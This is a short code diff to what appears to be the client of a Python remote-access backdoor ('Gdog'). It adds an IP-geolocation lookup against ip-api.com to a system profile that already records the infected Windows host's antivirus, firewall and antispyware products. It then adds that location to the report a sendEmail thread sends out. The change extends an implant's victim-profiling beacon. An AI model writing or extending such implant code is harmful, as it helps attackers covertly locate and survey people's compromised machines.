@@ -47,6 +47,7 @@ import wmi
 import getpass
 import uuid
 import netifaces
+import urllib2
 
 from win32com.client import GetObject
 from enum import Enum
@@ -130,6 +131,23 @@ class ChassisTypes(Enum):
     RackMountChassis = 23
     SealedCasePC = 24
         
+def getGeolocation():
+    """Retrieve IP Geolocation for single target"""
+    
+
+    req = urllib2.Request('http://ip-api.com/json/', data=None, headers={
+      'User-Agent':'Gdog'
+    })
+    
+    response = urllib2.urlopen(req)
+    
+    if response.code == 200:
+        encoding = response.headers.getparam('charset')
+        return json.loads(response.read().decode(encoding))
+            
+    return False
+
+
 class SystemInfo:
     def __init__(self):
         self.Architecture = platform.machine()
@@ -182,6 +200,7 @@ class SystemInfo:
         objWMI = GetObject('winmgmts:\\\\.\\root\\SecurityCenter2').InstancesOf('AntiSpywareProduct')
         for i in objWMI:
             self.Antispyware.append(i.displayName.strip())
+        self.Geolocation = getGeolocation()
         
         self.UniqueID = hashlib.sha256(
                            self.Architecture + 
@@ -697,6 +716,7 @@ class sendEmail(threading.Thread):
                   'av': sysInfo.Antivirus,
                   'firewall': sysInfo.Firewall,
                   'antispyware': sysInfo.Antispyware,
+                  'geolocation': sysInfo.Geolocation,
                   'tag': TAG,
                   'version': VERSION,
                   'msg': self.text
